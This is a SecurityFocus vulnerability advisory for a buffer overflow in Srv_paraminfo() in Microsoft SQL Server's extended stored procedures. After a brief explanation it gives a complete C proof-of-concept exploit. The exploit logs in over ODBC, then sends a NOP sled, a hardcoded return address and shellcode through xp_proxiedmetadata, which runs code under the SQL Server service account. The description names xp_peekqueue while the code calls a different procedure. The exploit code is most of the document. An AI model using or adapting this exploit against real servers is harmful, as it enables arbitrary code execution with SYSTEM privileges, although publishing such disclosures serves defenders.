source: http://www.securityfocus.com/bid/2040/info

The API Srv_paraminfo(), which is implemented by Extended Stored Procedures (XPs) in Microsoft SQL Server and Data Engine, is susceptible to a buffer overflow vulnerability which may cause the application to fail or arbitrary code to be executed on the target system depending on the data entered into the buffer.

XPs are DLL files that perform high level functions in SQL Server. When called, they invoke a function called Srv_paraminfo() to parse the input parameters.

A vulnerability lies in Srv_paraminfo() and the fact that it does not check the length of the parameter string that an XP passes to it. If an attacker can pass an overly long string to the XP xp_peekqueue, a buffer overflow can occur due to an unsafe memory copy. This can cause SQL Server to crash.

It may also be possible for attackers to execute arbitrary code on the host running SQL Server. The attacker would need to overwrite the return address of the calling function with the address of supplied shellcode in memory. This shellcode would be executed under the context of the account that the SQL Server service was configured to run under. The minimum privilege level that the account would have to possess are SYSTEM privileges.

This vulnerability is confined to those who can successfully log onto the SQL server. 

// SQL2KOverflow.c
// This code creates a file called 'SQL2KOverflow.txt' in the root of the
// c: drive.


#include <stdio.h>
#include <windows.h>
#include <wchar.h>
#include <lmcons.h>
#include <sql.h>
#include <sqlext.h>


int Syntax()
{
	printf( "Syntax error. Correct syntax is:\nSQL2KOverflow
<hostname> <username> <password>");
	return 1;
}


int main(int argc, char *argv[])
{
	char szBuffer[1025];
	SWORD     swStrLen;
	SQLHDBC   hdbc;
	SQLRETURN nResult;             
	SQLHANDLE henv;
	HSTMT  hstmt;                      
	SCHAR InConnectionString[1025] = "DRIVER={SQL Server};SERVER=";
	UCHAR query[20000] = "exec xp_proxiedmetadata 'a', '";
	int count;

	if ( argc != 4 )
	{
		return Syntax();
	}

	if ( ( strlen( argv[1] ) > 250 ) ||
		( strlen( argv[2] ) > 250 )  ||
		( strlen( argv[3] ) > 250 ) )
		return Syntax();

	strcat( InConnectionString, argv[1] );
	strcat( InConnectionString, ";UID=" );
	strcat( InConnectionString, argv[2] );
	strcat( InConnectionString, ";PWD=" );
	strcat( InConnectionString, argv[3] );
	strcat( InConnectionString, ";DATABASE=master" );

	for ( count = 30; count < 2598; count++ )
		query[count] = (char)0x90;
	
	query[count] = 0;

	// 0x77782548 = wx%H = this works sp0
	strcat( query, "\x48\x25\x78\x77" );
	
	strcat( query,
"\x90\x90\x90\x90\x90\x33\xC0Ph.txthflowhOverhQL2khc:\\STYPP@PHPPPQ\xB8\x8D+\xE9\x77\xFF\xD0\x33\xC0P\xB8\xCF\x06\xE9\x77\xFF\xD0"
);
	
	strcat( query, "', 'a', 'a'" );


	if (SQLAllocHandle(SQL_HANDLE_ENV,SQL_NULL_HANDLE,&henv) !=
SQL_SUCCESS)
		{
			printf("Error SQLAllocHandle");
			return 0;

		}

	if (SQLSetEnvAttr(henv, SQL_ATTR_ODBC_VERSION,(SQLPOINTER)
SQL_OV_ODBC3, SQL_IS_INTEGER) != SQL_SUCCESS)
		{
			printf("Error SQLSetEnvAttr");
			return 0;

		}


	if ((nResult = SQLAllocHandle(SQL_HANDLE_DBC,henv,(SQLHDBC FAR
*)&hdbc)) != SQL_SUCCESS) 
		{
			printf("SQLAllocHandle - 2");
			return 0;
			
		}

	nResult = SQLDriverConnect(hdbc, NULL, InConnectionString,
strlen(InConnectionString), szBuffer,  1024, &swStrLen,
SQL_DRIVER_COMPLETE_REQUIRED);      
	if(( nResult == SQL_SUCCESS ) | ( nResult ==
SQL_SUCCESS_WITH_INFO) )
		{

			printf("Connected to MASTER database...\n\n");
			SQLAllocStmt(hdbc,&hstmt);
		}



	if(SQLExecDirect(hstmt,query,SQL_NTS) ==SQL_SUCCESS)
		{
			printf("\nSQL Query error");

			return 0;

		}
	printf("Buffer sent...");	
	


return 0;
}